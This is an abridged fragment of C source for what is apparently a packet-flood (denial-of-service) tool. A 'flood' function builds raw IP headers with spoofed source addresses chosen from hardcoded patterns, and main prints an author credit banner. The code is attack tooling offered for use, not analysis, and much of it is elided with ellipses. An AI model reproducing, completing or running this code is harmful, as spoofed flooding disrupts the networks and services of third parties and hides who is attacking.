...
void *flood(void *par1)
{
	...
	//	iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
			...
			iph->saddr = (rand_cmwc() >> 16 & 0xFF) << 24 | (243) << 16  | (247) << 8 | (2);
			}if(fx == 3){
			iph->saddr = (rand_cmwc() >> 16 & 0xFF) << 24 | (241) << 16  | (247) << 8 | (2);
			}if(fx == 4){
			iph->saddr = (rand_cmwc() >> 16 & 0xFF) << 24 | (242) << 16  | (247) << 8 | (2);
			}if(fx == 5){
			iph->saddr = (rand_cmwc() >> 16 & 0xFF) << 24 | (243) << 16  | (247) << 8 | (2);
			}if(fx == 6){
			iph->saddr = (rand_cmwc() >> 16 & 0xFF) << 24 | (80) << 16  | (249) << 8 | (66);	
			}if(fx == 7){
			iph->saddr = (rand_cmwc() >> 16 & 0xFF) << 24 | (79) << 16  | (249) << 8 | (66);	
			}if(fx == 8){
			iph->saddr = (rand_cmwc() >> 16 & 0xFF) << 24 | (236) << 16  | (15) << 8 | (89);		
			}if(fx == 9){
			iph->saddr = (rand_cmwc() >> 16 & 0xFF) << 24 | (237) << 16  | (15) << 8 | (89);
			}if(fx == 10){
			iph->saddr = (rand_cmwc() >> 16 & 0xFF) << 24 | (238) << 16  | (15) << 8 | (89);
			}if(fx == 11){
			iph->saddr = (rand_cmwc() >> 16 & 0xFF) << 24 | (239) << 16  | (15) << 8 | (89);
			}if(fx == 12){
...
int main(int argc, char *argv[ ])
{
        if(argc < 4){
                ...
                fprintf(stderr, "Created By: DJPizza\n");
                fprintf(stderr, "Facebook.Com/SkytechBatu\n");
